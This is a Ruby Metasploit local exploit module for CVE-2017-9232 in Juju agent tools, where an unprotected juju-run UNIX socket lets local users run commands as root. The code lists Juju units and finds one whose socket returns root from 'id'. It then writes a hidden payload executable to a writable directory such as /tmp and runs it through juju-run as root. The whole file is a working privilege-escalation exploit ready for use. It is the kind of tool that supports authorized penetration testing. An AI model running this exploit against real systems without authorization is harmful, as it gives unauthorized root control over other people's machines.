# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Juju-run Agent Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Juju agent systems
        running the juju-run agent utility.

        Juju agent systems running agent tools prior to version 1.25.12,
        2.0.x before 2.0.4, and 2.1.x before 2.1.3, provide a UNIX domain socket
        to manage software ("units") without setting appropriate permissions,
        allowing unprivileged local users to execute arbitrary commands as root.

        This module has been tested successfully with Juju agent tools versions
        1.18.4, 1.25.5 and 1.25.9 on Ubuntu 14.04.1 LTS x86 deployed by Juju
        1.18.1-trusty-amd64 and 1.25.6-trusty-amd64 on Ubuntu 14.04.1 LTS x86_64.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Ryan Beisner&#039;, # Discovery and PoC
          &#039;David Ames (@thedac)&#039;, # Discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 13 2017&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-9232&#039; ],
          [ &#039;BID&#039;, &#039;98737&#039; ],
          [ &#039;URL&#039;, &#039;https://bugs.launchpad.net/juju/+bug/1682411&#039; ]
        ]
    ))
    register_options(
      [
        OptString.new(&#039;UNIT&#039;, [ false, &#039;A valid Juju unit name&#039;, &#039;&#039; ]),
        OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
      ])
  end

  def check
    juju_run_path = cmd_exec &#039;which juju-run&#039;

    if juju_run_path.start_with? &#039;/&#039;
      vprint_good &#039;juju-run is installed&#039;
      return CheckCode::Detected
    end

    vprint_error &#039;juju-run is NOT installed&#039;

    CheckCode::Safe
  end

  def unit_names
    units = []

    cmd_exec(&#039;/bin/ls -m /var/log/juju/*.log&#039;).chomp.split(/,\s*/).each do |log|
      units << ::File.basename(log).gsub(/\.log$/, &#039;&#039;)
    end

    cmd_exec(&#039;/bin/ls -m /var/lib/juju/agents/&#039;).chomp.split(/,\s*/).each do |agent|
      units << ::File.basename(agent)
    end

    units.uniq
  end

  def execute_command(cmd, opts = {})
    cmd_exec "juju-run #{opts[&#039;unit&#039;]} &#039;#{cmd}&#039;"
  end

  def upload_and_chmodx(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
    register_file_for_cleanup path
  end

  def exploit
    if check != CheckCode::Detected
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    units = datastore[&#039;UNIT&#039;].blank? ? unit_names : [ datastore[&#039;UNIT&#039;] ]

    if units.empty?
      fail_with Failure::Unknown, "Could not find any Juju units. Try specifying a &#039;UNIT&#039;"
    end

    # Check each unit for a privileged socket
    print_status "Trying #{units.size} units..."

    socket_unit = nil
    unit_names.each do |unit|
      id = execute_command &#039;id&#039;, &#039;unit&#039; => unit

      if id.include? &#039;root&#039;
        print_good "Unit #{unit.inspect} uses a privileged socket"
        socket_unit = unit
        break
      end
    end

    if socket_unit.nil?
      fail_with Failure::NotVulnerable, &#039;Could not find any Juju units using a privileged socket&#039;
    end

    # Upload payload executable
    payload_name = ".#{rand_text_alphanumeric rand(5..10)}"
    payload_path = "#{datastore[&#039;WritableDir&#039;]}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Execute payload executable
    vprint_status &#039;Executing payload...&#039;
    execute_command payload_path, &#039;unit&#039; => socket_unit
  end
end

